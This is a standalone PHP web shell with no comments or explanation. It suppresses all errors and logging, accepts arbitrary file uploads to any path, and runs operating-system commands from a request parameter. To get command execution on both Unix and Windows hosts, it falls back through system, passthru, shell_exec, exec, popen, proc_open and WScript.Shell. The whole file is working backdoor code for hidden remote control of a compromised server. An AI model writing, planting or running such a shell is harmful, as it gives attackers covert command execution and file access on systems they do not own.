<?php
@error_reporting(0);
@ini_set('display_errors',   '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors',       '0');
@ini_set('output_buffering', 'on');
@ini_set('memory_limit',     '-1');
@ini_set('max_execution_time','0');
@set_time_limit(0);
@set_error_handler(function(){return true;});
@set_exception_handler(function(){});

if(isset($_REQUEST['up'])){
    if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD']==='POST'){
        $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '.';
        if(isset($_FILES['f']) && isset($_FILES['f']['tmp_name'])){
            $dst = rtrim($path,'/') . '/' . basename($_FILES['f']['name']);
            if(@move_uploaded_file($_FILES['f']['tmp_name'], $dst)) echo 'ok:'.$dst;
            else echo 'fail';
        } elseif(isset($_POST['data']) && isset($_POST['name'])){
            $dst  = rtrim($path,'/') . '/' . basename($_POST['name']);
            $data = @base64_decode($_POST['data']);
            if($data !== false && @file_put_contents($dst, $data) !== false) echo 'ok:'.$dst;
            else echo 'fail';
        } else {
            echo 'fail';
        }
    } else {
        echo '<form method="post" enctype="multipart/form-data">'
            .'<input name="path" value="." placeholder="path"><br>'
            .'<input type="file" name="f"><br>'
            .'<input type="submit" value="upload">'
            .'</form>';
    }
    exit;
}

if(!isset($_REQUEST['c'])) exit;
$c = $_REQUEST['c'];
if((string)$c === '') exit;

$o = '';

if($o==='' && function_exists('system')){
    @ob_start();
    @system($c);
    $t = @ob_get_clean();
    if($t !== false && $t !== null) $o = $t;
}

if($o==='' && function_exists('passthru')){
    @ob_start();
    @passthru($c);
    $t = @ob_get_clean();
    if($t !== false && $t !== null) $o = $t;
}

if($o==='' && function_exists('shell_exec')){
    $t = @shell_exec($c);
    if($t !== false && $t !== null) $o = (string)$t;
}

if($o==='' && function_exists('exec')){
    $r = array();
    $rc = 0;
    @exec($c, $r, $rc);
    if(!empty($r)) $o = implode("\n", $r);
}

if($o==='' && function_exists('popen')){
    $f = @popen($c, 'r');
    if($f !== false){
        while(!feof($f)) $o .= @fread($f, 4096);
        @pclose($f);
    }
}

if($o==='' && function_exists('proc_open')){
    $desc = array(
        1 => array('pipe','w'),
        2 => array('pipe','w'),
    );
    $pipes = array();
    $p = @proc_open($c, $desc, $pipes);
    if($p !== false){
        $o  = '';
        if(isset($pipes[1])){ $o .= @stream_get_contents($pipes[1]); @fclose($pipes[1]); }
        if(isset($pipes[2])){ $o .= @stream_get_contents($pipes[2]); @fclose($pipes[2]); }
        @proc_close($p);
    }
}

if($o==='' && class_exists('COM')){
    $wsh = @new COM('WScript.Shell');
    if($wsh){
        $ex = @$wsh->Exec('cmd /c '.$c);
        if($ex){
            $so = @$ex->StdOut(); if($so) $o .= @$so->ReadAll();
            $se = @$ex->StdErr(); if($se) $o .= @$se->ReadAll();
        }
    }
}

echo $o;
